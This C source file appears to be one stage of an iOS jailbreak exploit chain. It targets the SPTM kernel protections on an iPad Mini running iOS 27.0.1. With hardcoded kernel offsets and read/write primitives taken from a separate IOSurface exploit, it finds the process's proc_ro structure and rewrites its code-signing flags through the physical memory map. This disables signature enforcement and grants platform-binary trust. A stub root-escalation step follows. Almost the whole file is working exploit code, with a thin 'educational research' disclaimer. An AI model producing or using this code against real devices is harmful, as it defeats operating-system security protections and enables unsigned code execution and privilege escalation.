/*
 * Physical Aperture ROZONE Bypass for SPTM Devices
 * Educational jailbreak research only. For use on devices you own.
 *
 * Target: iPad Mini (iPad16,1), A17 Pro, iOS 27.0.1 (Build 24A446)
 * Kernel: xnu-13432.2.10~2/RELEASE_ARM64_T8122, Darwin 27.0.0
 *
 * SPTM-era approach:
 *   SPTM protects virtual page table entries but the physical aperture
 *   (physmap) provides a separate RW mapping of all physical RAM. ROZONE
 *   pages are protected at the PTE level, but phystokv() gives an
 *   alternate VA that may still be writable from EL1 through the kernel's
 *   own kwrite primitive (depends on SPRR index for physmap PTEs — test
 *   empirically on target device).
 *
 *   Key difference from pre-SPTM: kvtophys uses AT S1E1R hardware
 *   instruction, NOT gVirtBase/gPhysBase arithmetic. phystokv uses a
 *   multi-range physmap table in __DATA_CONST.
 *
 * Offsets extracted from iPad16,1 iOS 27.0.1 kernelcache (IPSW analysis).
 */

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>

/* ===== Code signing flags (osfmk/kern/cs_blobs.h) ===== */
#define CS_VALID            0x00000001
#define CS_ADHOC            0x00000002
#define CS_GET_TASK_ALLOW   0x00000004
#define CS_HARD             0x00000100
#define CS_KILL             0x00000200
#define CS_DEBUGGED         0x10000000
#define CS_PLATFORM_BINARY  0x04000000

/* ===== Kernel offsets — iPad16,1 iOS 27.0.1, xnu-13432.2.10 ===== */

/* Kernel base (unslid) */
#define KBASE_UNSLID        0xfffffff00700c000ULL

/* Segment layout (unslid) */
#define TEXT_EXEC_BASE      0xfffffff00a858000ULL
#define DATA_CONST_BASE     0xfffffff007ce4000ULL
#define DATA_BASE           0xfffffff00b3b4000ULL

/*
 * Physmap table pointer in __DATA_CONST.
 * SPTM kernels replace gVirtBase/gPhysBase with a multi-range table.
 * Each entry: { uint64_t phys_base, uint64_t virt_base, uint64_t size_in_pages }
 * Pages are 16KB (0x4000).
 * Pointer at __DATA_CONST vmaddr 0xfffffff007d97788.
 */
#define OFF_PHYSMAP_TABLE_PTR   0x00D8B788  /* kbase + this = physmap table pointer */

/*
 * PID hash table pointer address.
 * proc_find uses a hash table (not allproc walk) to look up processes by PID.
 * Address: 0xfffffff00b480208 (__DATA segment).
 */
#define OFF_PIDHASH_PTR         0x04474208  /* kbase + this = pid hash table pointer */

/* proc struct offsets (confirmed from proc_find disassembly) */
#define PROC_P_PROC_RO     0x18    /* proc -> proc_ro pointer */
#define PROC_P_PID          0x60    /* proc -> p_pid (uint32_t) */
#define PROC_HASH_ENTRY     0xa0    /* proc -> pidhash LIST_ENTRY */
#define PROC_P_LIST_NEXT    0x00    /* proc -> allproc list next pointer */

/* proc_ro struct offsets (confirmed from zalloc_ro_mut analysis) */
#define PROC_RO_PR_PROC     0x00    /* proc_ro -> back-pointer to proc */
#define PROC_RO_P_CSFLAGS   0x20    /* proc_ro -> p_csflags (uint32_t) */
#define PROC_RO_P_UCRED     0x28    /* proc_ro -> p_ucred (kauth_cred_t) */

/* Physmap table entry layout */
struct physmap_entry {
    uint64_t phys_base;     /* 0x00: physical base address */
    uint64_t virt_base;     /* 0x08: kernel virtual base for this range */
    uint64_t size_in_pages; /* 0x10: number of 16KB pages in this range */
};

#define PHYSMAP_PAGE_SIZE   0x4000  /* 16KB pages on arm64 */

/* ===== Kernel R/W primitives (provided by IOSurface exploit) ===== */
extern uint64_t kread64(uint64_t addr);
extern uint32_t kread32(uint64_t addr);
extern void kwrite64(uint64_t addr, uint64_t val);
extern void kwrite32(uint64_t addr, uint32_t val);

/* ===== Runtime state ===== */
static uint64_t kernel_slide = 0;
static uint64_t kbase = 0;

/* Physmap table (read from kernel at runtime) */
static struct physmap_entry *physmap_table = NULL;
static uint32_t physmap_entry_count = 0;

/*
 * Read the physmap table from kernel memory.
 * SPTM kernels store a pointer to the table in __DATA_CONST.
 * The table pointer itself points to a struct with:
 *   [ptr + 0x0]: entry count (uint32_t)
 *   followed by entries of 24 bytes each
 *
 * Actually the layout is:
 *   __DATA_CONST+0x780: pointer to count (or count directly)
 *   __DATA_CONST+0x788: pointer to table entries
 */
static int
read_physmap_table(void)
{
    uint64_t table_ptr_addr = kbase + OFF_PHYSMAP_TABLE_PTR;
    uint64_t table_ptr = kread64(table_ptr_addr);

    if (table_ptr == 0) {
        fprintf(stderr, "[-] physmap table pointer is NULL\n");
        return -1;
    }

    /* Read entry count from [table_ptr_addr - 8] (the count pointer) */
    uint64_t count_ptr_addr = table_ptr_addr - 8;
    uint64_t count_ptr = kread64(count_ptr_addr);
    physmap_entry_count = kread32(count_ptr);

    if (physmap_entry_count == 0 || physmap_entry_count > 64) {
        fprintf(stderr, "[-] Invalid physmap entry count: %u\n", physmap_entry_count);
        return -1;
    }

    printf("[+] Physmap table: %u entries at 0x%llx\n", physmap_entry_count, table_ptr);

    physmap_table = (struct physmap_entry *)malloc(
        physmap_entry_count * sizeof(struct physmap_entry));
    if (!physmap_table) return -1;

    for (uint32_t i = 0; i < physmap_entry_count; i++) {
        uint64_t entry_addr = table_ptr + i * 24;
        physmap_table[i].phys_base = kread64(entry_addr + 0);
        physmap_table[i].virt_base = kread64(entry_addr + 8);
        physmap_table[i].size_in_pages = kread64(entry_addr + 16);

        uint64_t range_size = physmap_table[i].size_in_pages * PHYSMAP_PAGE_SIZE;
        printf("  [%u] phys 0x%llx, virt 0x%llx, size 0x%llx (%llu MB)\n",
               i, physmap_table[i].phys_base, physmap_table[i].virt_base,
               range_size, range_size / (1024 * 1024));
    }

    return 0;
}

/*
 * kvtophys — convert kernel VA to physical address.
 *
 * SPTM-era: iterate the physmap table to find which range contains the VA,
 * then compute PA = (va - virt_base) + phys_base.
 *
 * The actual kernel uses AT S1E1R hardware instruction at kbase+0x40C0224,
 * but from userspace we must use the table lookup.
 */
static uint64_t
kvtophys(uint64_t va)
{
    for (uint32_t i = 0; i < physmap_entry_count; i++) {
        uint64_t range_start = physmap_table[i].virt_base;
        uint64_t range_size = physmap_table[i].size_in_pages * PHYSMAP_PAGE_SIZE;
        uint64_t range_end = range_start + range_size;

        if (va >= range_start && va < range_end) {
            return (va - range_start) + physmap_table[i].phys_base;
        }
    }

    fprintf(stderr, "[-] kvtophys: VA 0x%llx not in any physmap range\n", va);
    return 0;
}

/*
 * phystokv — convert physical address to kernel VA via physical aperture.
 *
 * SPTM-era: iterate the physmap table to find which range contains the PA,
 * then compute VA = (pa - phys_base) + virt_base.
 */
static uint64_t
phystokv(uint64_t pa)
{
    for (uint32_t i = 0; i < physmap_entry_count; i++) {
        uint64_t phys_start = physmap_table[i].phys_base;
        uint64_t range_size = physmap_table[i].size_in_pages * PHYSMAP_PAGE_SIZE;
        uint64_t phys_end = phys_start + range_size;

        if (pa >= phys_start && pa < phys_end) {
            return (pa - phys_start) + physmap_table[i].virt_base;
        }
    }

    fprintf(stderr, "[-] phystokv: PA 0x%llx not in any physmap range\n", pa);
    return 0;
}

/*
 * Write to a ROZONE address through the physical aperture.
 * Step 1: kvtophys(rozone_va) to get the physical address
 * Step 2: phystokv(pa) to get the physmap VA (alternate mapping)
 * Step 3: kwrite32 through the physmap VA
 *
 * NOTE: This may fault if SPTM marks physmap PTEs for ROZONE pages as
 * read-only via SPRR index. Must be tested empirically on target device.
 * If it does fault, the SmartIO DMA bypass path is needed instead.
 */
static void
rozone_write32(uint64_t rozone_va, uint32_t value)
{
    uint64_t pa = kvtophys(rozone_va);
    if (pa == 0) return;

    uint64_t physmap_va = phystokv(pa);
    if (physmap_va == 0) return;

    printf("[*] rozone_write32: VA 0x%llx -> PA 0x%llx -> physmap 0x%llx\n",
           rozone_va, pa, physmap_va);
    kwrite32(physmap_va, value);
}

static uint32_t
rozone_read32(uint64_t rozone_va)
{
    uint64_t pa = kvtophys(rozone_va);
    if (pa == 0) return 0;

    uint64_t physmap_va = phystokv(pa);
    if (physmap_va == 0) return 0;

    return kread32(physmap_va);
}

/*
 * Find our process via the PID hash table (not allproc walk).
 *
 * proc_find uses a hash table at 0xfffffff00b480208 (kbase + 0x4474208).
 * Hash function: derived from PID value.
 * Each bucket is a singly-linked list of proc structs via PROC_HASH_ENTRY.
 */
static uint64_t
find_our_proc(void)
{
    pid_t our_pid = getpid();
    printf("[*] Looking for PID %d\n", our_pid);

    /* Read hash table pointer */
    uint64_t hashtable_ptr_addr = kbase + OFF_PIDHASH_PTR;
    uint64_t hashtable = kread64(hashtable_ptr_addr);
    if (hashtable == 0) {
        fprintf(stderr, "[-] PID hash table pointer is NULL\n");
        return 0;
    }

    /*
     * Hash table size is typically a power of 2. The hash mask is stored
     * adjacent to the table pointer. For now, use a simple scan approach:
     * iterate a reasonable number of buckets looking for our PID.
     *
     * proc_find hash function (from disassembly):
     *   bucket = pidhash[pid & pidhashmask]
     * where pidhashmask is typically 0xFF or 0x1FF (256 or 512 buckets).
     */
    uint32_t bucket_count = 256; /* conservative estimate */

    for (uint32_t b = 0; b < bucket_count; b++) {
        uint64_t entry = kread64(hashtable + b * 8);
        while (entry != 0) {
            /* entry points to the hash_entry field within proc */
            /* proc = entry - PROC_HASH_ENTRY */
            uint64_t proc = entry - PROC_HASH_ENTRY;
            uint32_t pid = kread32(proc + PROC_P_PID);

            if (pid == (uint32_t)our_pid) {
                printf("[+] Found proc for PID %d at 0x%llx\n", our_pid, proc);
                return proc;
            }

            /* Next in hash chain: entry->le_next (first field of LIST_ENTRY) */
            entry = kread64(entry);
        }
    }

    /*
     * Fallback: walk allproc list from the first proc.
     * First entry in hash bucket 0 is typically kernproc (PID 0).
     */
    uint64_t first_entry = kread64(hashtable);
    if (first_entry != 0) {
        uint64_t proc = first_entry - PROC_HASH_ENTRY;
        /* Walk p_list (at offset 0x0 in proc) */
        uint64_t cur = kread64(proc + PROC_P_LIST_NEXT);
        int limit = 2000;
        while (cur != 0 && limit-- > 0) {
            uint32_t pid = kread32(cur + PROC_P_PID);
            if (pid == (uint32_t)our_pid) {
                printf("[+] Found proc for PID %d at 0x%llx (via allproc walk)\n",
                       our_pid, cur);
                return cur;
            }
            cur = kread64(cur + PROC_P_LIST_NEXT);
        }
    }

    fprintf(stderr, "[-] Process %d not found\n", our_pid);
    return 0;
}

/*
 * Get proc_ro pointer from proc struct.
 */
static uint64_t
get_proc_ro(uint64_t proc_addr)
{
    uint64_t proc_ro = kread64(proc_addr + PROC_P_PROC_RO);
    if (proc_ro == 0) {
        fprintf(stderr, "[-] proc_ro is NULL\n");
        return 0;
    }

    /* Validate: proc_ro->pr_proc should point back to proc */
    uint64_t back_ptr = kread64(proc_ro + PROC_RO_PR_PROC);
    if (back_ptr != proc_addr) {
        fprintf(stderr, "[!] proc_ro back-pointer mismatch: 0x%llx != 0x%llx\n",
                back_ptr, proc_addr);
        /* Non-fatal — layout may differ slightly */
    }

    return proc_ro;
}

/*
 * Bypass code signing by modifying cs_flags through the physical aperture.
 * Sets CS_DEBUGGED to disable code signature enforcement for this process.
 */
static int
bypass_code_signing(uint64_t proc_ro_addr)
{
    uint64_t csflags_addr = proc_ro_addr + PROC_RO_P_CSFLAGS;

    /* Read current flags (through physmap to test read path) */
    uint32_t current_flags = rozone_read32(csflags_addr);
    printf("[*] Current cs_flags: 0x%08x\n", current_flags);

    if (current_flags == 0) {
        /* Fallback: direct read (not through physmap) */
        current_flags = kread32(csflags_addr);
        printf("[*] cs_flags (direct read): 0x%08x\n", current_flags);
    }

    /* Desired flags:
     * + CS_DEBUGGED: bypass code signature validation entirely
     * + CS_PLATFORM_BINARY: platform-level trust
     * + CS_GET_TASK_ALLOW: allow debugger attachment
     * - CS_HARD: don't kill on invalid signature
     * - CS_KILL: don't kill on invalid signature
     */
    uint32_t new_flags = current_flags;
    new_flags |= CS_DEBUGGED;
    new_flags |= CS_PLATFORM_BINARY;
    new_flags |= CS_GET_TASK_ALLOW;
    new_flags &= ~CS_HARD;
    new_flags &= ~CS_KILL;

    printf("[*] Writing new cs_flags: 0x%08x\n", new_flags);
    rozone_write32(csflags_addr, new_flags);

    /* Verify */
    uint32_t verify = kread32(csflags_addr);
    if (verify != new_flags) {
        fprintf(stderr, "[-] cs_flags write FAILED: got 0x%08x, expected 0x%08x\n",
                verify, new_flags);
        fprintf(stderr, "[-] SPTM may be enforcing read-only on physmap for ROZONE pages\n");
        fprintf(stderr, "[-] Try SmartIO DMA bypass path instead\n");
        return -1;
    }

    printf("[+] cs_flags modified: 0x%08x -> 0x%08x\n", current_flags, new_flags);
    return 0;
}

/*
 * Escalate to root by modifying ucred through the physical aperture.
 * ucred is at proc_ro+0x28 and is itself typically in a ROZONE.
 */
static int
escalate_to_root(uint64_t proc_ro_addr)
{
    uint64_t ucred_ptr = kread64(proc_ro_addr + PROC_RO_P_UCRED);
    if (ucred_ptr == 0) {
        fprintf(stderr, "[-] ucred pointer is NULL\n");
        return -1;
    }
    printf("[*] ucred at 0x%llx\n", ucred_ptr);

    /*
     * ucred layout (approximate — verify from binary):
     *   cr_posix.cr_uid:  offset ~0x18 (effective UID)
     *   cr_posix.cr_ruid: offset ~0x1c (real UID)
     *   cr_posix.cr_svuid: offset ~0x20 (saved UID)
     *   cr_posix.cr_rgid: offset ~0x28 (real GID)
     *
     * These offsets need verification from the kernelcache.
     * For now, log the ucred pointer for manual inspection.
     */
    printf("[*] ucred escalation: needs ucred field offset verification\n");
    printf("[*] ucred pointer: 0x%llx — inspect with kread32 to find UID fields\n",
           ucred_ptr);

    return 0;
}

/* ===== Main entry point ===== */

int
physmap_bypass_main(uint64_t kbase_with_slide)
{
    printf("[*] SPTM Physical Aperture ROZONE Bypass\n");
    printf("[*] Target: iPad16,1 (A17 Pro), iOS 27.0.1\n");
    printf("[*] Kernel: xnu-13432.2.10~2/RELEASE_ARM64_T8122\n\n");

    /* Compute slide and base */
    kernel_slide = kbase_with_slide - KBASE_UNSLID;
    kbase = kbase_with_slide;
    printf("[+] Kernel base: 0x%llx (slide: 0x%llx)\n", kbase, kernel_slide);

    /* Step 1: Read the physmap table */
    printf("\n[*] Step 1: Reading physmap table...\n");
    if (read_physmap_table() != 0) {
        return -1;
    }

    /* Step 2: Find our proc via PID hash table */
    printf("\n[*] Step 2: Finding our process...\n");
    uint64_t proc = find_our_proc();
    if (proc == 0) {
        return -1;
    }

    /* Step 3: Get proc_ro */
    printf("\n[*] Step 3: Getting proc_ro...\n");
    uint64_t proc_ro = get_proc_ro(proc);
    if (proc_ro == 0) {
        return -1;
    }
    printf("[+] proc_ro at 0x%llx\n", proc_ro);

    /* Step 4: Bypass code signing */
    printf("\n[*] Step 4: Bypassing code signing...\n");
    if (bypass_code_signing(proc_ro) != 0) {
        return -1;
    }

    /* Step 5: Escalate to root */
    printf("\n[*] Step 5: Attempting root escalation...\n");
    if (escalate_to_root(proc_ro) != 0) {
        fprintf(stderr, "[!] Root escalation incomplete (non-fatal)\n");
    }

    /* Cleanup */
    free(physmap_table);
    physmap_table = NULL;

    printf("\n[+] SPTM bypass complete!\n");
    printf("[+] Process has CS_DEBUGGED | CS_PLATFORM_BINARY | CS_GET_TASK_ALLOW\n");
    printf("[+] Can load unsigned code and install jailbreak bootstrap\n");
    return 0;
}
